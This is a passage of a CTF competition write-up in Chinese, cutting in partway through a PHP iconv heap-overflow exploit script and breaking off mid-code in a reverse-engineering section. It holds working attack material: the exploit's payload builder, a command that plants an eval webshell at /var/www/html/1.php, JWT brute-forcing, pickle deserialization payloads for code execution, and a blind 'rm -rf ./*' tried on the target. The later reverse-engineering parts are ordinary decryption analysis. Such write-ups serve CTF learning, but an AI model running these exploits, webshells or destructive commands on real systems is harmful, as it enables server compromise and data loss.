class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            size=CS,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_custom_heap = ptr_bucket(</span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">        COMMAND = self.command</span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.sleep:</span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> (</span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap = COMMAND</span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">        pages = (</span><br><span class="line">                step4 * <span class="number">3</span></span><br><span class="line">                + step4_pwn</span><br><span class="line">                + step4_custom_heap</span><br><span class="line">                + step4_use_custom_heap</span><br><span class="line">                + step3_overflow</span><br><span class="line">                + pad * self.pad</span><br><span class="line">                + step1 * <span class="number">3</span></span><br><span class="line">                + step2_write_ptr</span><br><span class="line">                + step2 * <span class="number">2</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resource = compress(compress(pages))</span><br><span class="line">        resource = b64(resource)</span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        filters = [</span><br><span class="line">            <span class="comment"># Create buckets</span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.latin1.latin1&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        path = self.build_exploit_path()</span><br><span class="line">        start = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.remote.send(path)</span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.sleep:</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> start + self.sleep &lt;= time.time():</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line"></span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://<span class="number">192.168</span><span class="number">.18</span><span class="number">.24</span>/ <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[0]);?&gt;&#x27;&gt;/var/www/html/1.php;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205406473-2044450703.png" alt="img"></p><h2 id="ez-python">ez_python</h2><p>扫了发现只有个login路由,交叉爆破一下用户名密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>爆出用户名密码是test/123456返回给了个token,是jwt,存在密钥,爆破一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205437172-318927515.png" alt="img"></p><p>得到key是a123456,然后jwt伪造</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205444958-1050385586.png" alt="img"></p><p>更改jwt后点access后有一个弹窗，说ser有点好东西</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205502169-1811646368.png" alt="img"></p><p>访问后能得到部分源码:</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205513354-1792537572.png" alt="img"></p><p>分析源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hhhhackme</span>(<span class="params">pickled</span>):</span><br><span class="line">    data = base64.urlsafe_b64decode(pickled)</span><br><span class="line">    deserialized = pickle.loads(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>,<span class="number">204</span>;</span><br></pre></td></tr></table></figure><p>发现能打python反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;ls&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br></pre></td></tr></table></figure><p>将上面结果发过去后并多次测试后发现无回显不出网</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205601347-1546485428.png" alt="img"></p><p>因为无回显不出网，无法判断命令能否正常执行，所以尝试了一些破坏性的命令如<code>rm -rf ./*</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205613652-933257913.png" alt="img"></p><p>判断出文件路径<code>/app/ser.py</code></p><p>可以将命令结果直接写到这个文件并且读取了，因为写文件会影响<code>ser.py</code>文件的正常运行，所以在前面加<code>#</code>后面拼接命令，但是要注意的是输出的结果不要太多行，因为读取源码的时候发现会在每行后面加<code>\n</code>，输出多行的话只会在第一行前面加<code>#</code>，还是需要重启环境</p><p>最后猜测flag位置在<code>/flag</code>，直接<code>cat /flag</code>将结果输入到<code>ser.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd=<span class="string">&#x27;&#x27;&#x27;import os;os.system(&#x27;echo &quot;#&quot;+&quot;`cat /flag`&quot; &gt;&gt; /app/ser.py&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (cmd,))</span><br><span class="line"></span><br><span class="line">malicious_data = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line">encoded_malicious_data = base64.urlsafe_b64encode(malicious_data).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encoded malicious payload:&quot;</span>, encoded_malicious_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：Encoded malicious payload: gASVWAAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw8aW1wb3J0IG9zO29zLnN5c3RlbSgnZWNobyAiIyIrImBjYXQgL2ZsYWdgIiA-PiAvYXBwL3Nlci5weScplIWUUpQu</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205654359-4809249.png" alt="img"></p><p>再次访问ser得到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110205703837-1572091863.png" alt="img"></p><p>flag: 37ea8bacf16f4c1899ba23560c0b3ed1</p><h1>Reverse</h1><h2 id="joyVBS">joyVBS</h2><p>​经典的VBS混淆，强网刚遇到过，给dim定义之后输出以下代码逻辑，一开始用WScript.Echo复制不了数据人麻了，ocr卡半天，后面加了两行代码给dump到本地才行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;111.txt&quot;</span>, <span class="keyword">True</span>)</span><br><span class="line"><span class="keyword">file</span>.WriteLine(output)</span><br><span class="line"><span class="keyword">file</span>.Close</span><br></pre></td></tr></table></figure><p>发现就是解一个凯撒加base64,凯撒的偏移是12</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/vZoWSoai2VpZq5eB.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/5xhOndXOdLLkNd4M.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/zSOBc0GiPRVBaGPD.png!thumbnail" alt="img"></p><h2 id="Rafflesia">Rafflesia</h2><p>花指令，jzjnz直接nop，然后直接动态跟逻辑，干掉反调继续往下走</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Sm60hiT4Q2tDxOTz.png!thumbnail" alt="img"></p><p>然后跟到回调之后有码表的更换</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/ItJH9zPZWTbYzP7t.png!thumbnail" alt="img"></p><p>直接跑起来弄出码表，然后发现主逻辑中藏了一个异或24的逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/2B0uj3goqtqlJTgv.png!thumbnail" alt="img"></p><p>密文异或完24直接解变表base64即可</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/GhYJvDIApuRcmE5v.png!thumbnail" alt="img"></p><h2 id="RE5">RE5</h2><p>面上的就是经典tea，不过肯定没这么简单，调起来之后主要就是</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/KrfmuTQsKbCFoif6.png!thumbnail" alt="img">动调之后触发了两段除零异常</p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/Lsnpv8VSic2hiDDZ.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/qeaAheFM9BV9FaY0.png!thumbnail" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/M1racle-7/tuchuang/tuchuang/gWB8DWImRToEGCR1.png!thumbnail" alt="img"></p><p>给密钥换了，然后是加密的逻辑过程中也有异常被触发，走的都是上述相同的异常逻辑，直接提取密文模拟一下随机数获取的逻辑即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* data, <span class="type">uint32_t</span>* key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> block1 = data[<span class="number">0</span>], block2 = data[<span class="number">1</span>], round_sum, idx;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> round_sums[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sums[idx] = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="keyword">if</span> (idx != <span class="number">0</span>)</span><br><span class="line">            round_sums[idx] += round_sums[idx - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key_part1 = key[<span class="number">0</span>], key_part2 = key[<span class="number">1</span>], key_part3 = key[<span class="number">2</span>], key_part4 = key[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">32</span>; idx++) &#123;</span><br><span class="line">        round_sum = round_sums[<span class="number">31</span> - idx];</span><br><span class="line">        block2 -= ((block1 &lt;&lt; <span class="number">4</span>) + key_part3) ^ (block1 + round_sum) ^ ((block1 &gt;&gt; <span class="number">5</span>) + key_part4);</span><br><span class="line">        block1 -= ((block2 &lt;&lt; <span class="number">4</span>) + key_part1) ^ (block2 + round_sum) ^ ((block2 &gt;&gt; <span class="number">5</span>) + key_part2);</span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="number">0</span>] = block1; data[<span class="number">1</span>] = block2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">uint32_t</span> data[] = &#123;<span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(data, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">2</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">4</span>, key);</span><br><span class="line">    <span class="built_in">decrypt</span>(data + <span class="number">6</span>, key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, data);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exec">exec</h2><p>下下来之后用pycharm打开，按照他给的base解密</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"><span class="built_in">exp</span> = (每次解密后的得出解密代码)<span class="comment">#把前面的”exec(“和后面”)“删掉</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解码后的数据写入到一个文本文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded_output28.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">     f.<span class="built_in">write</span>(<span class="built_in">exp</span>)</span><br><span class="line">        </span><br><span class="line">print(<span class="string">&quot;解密结果已经写入到 decoded_output28.txt 文件中。&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共这样循环28次的base64/32/85</p><p>最后解出来是个rc4加密：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>=<span class="literal">True</span></span><br><span class="line"><span class="attribute">d</span>=len</span><br><span class="line"><span class="attribute">G</span>=list</span><br><span class="line"><span class="attribute">g</span>=range</span><br><span class="line"><span class="attribute">s</span>=next</span><br><span class="line"><span class="attribute">R</span>=bytes</span><br><span class="line"><span class="attribute">o</span>=input</span><br><span class="line"><span class="attribute">Y</span>=print</span><br><span class="line"></span><br><span class="line">def l(S):</span><br><span class="line">    <span class="attribute">i</span>=0</span><br><span class="line">    <span class="attribute">j</span>=0</span><br><span class="line">    <span class="keyword">while</span> a:</span><br><span class="line">        i=(i+1)%256</span><br><span class="line">        j=(j+S[i])%256</span><br><span class="line">        S[i],S[j]=S[j],S[i]</span><br><span class="line">        <span class="attribute">K</span>=S[(S[i]+S[j])%256]</span><br><span class="line">    yield K</span><br><span class="line"></span><br><span class="line">def N(key,O):</span><br><span class="line">     <span class="attribute">I</span>=d(key)</span><br><span class="line">     <span class="attribute">S</span>=G(g(256))</span><br><span class="line">     <span class="attribute">j</span>=0</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> g(256):</span><br><span class="line">        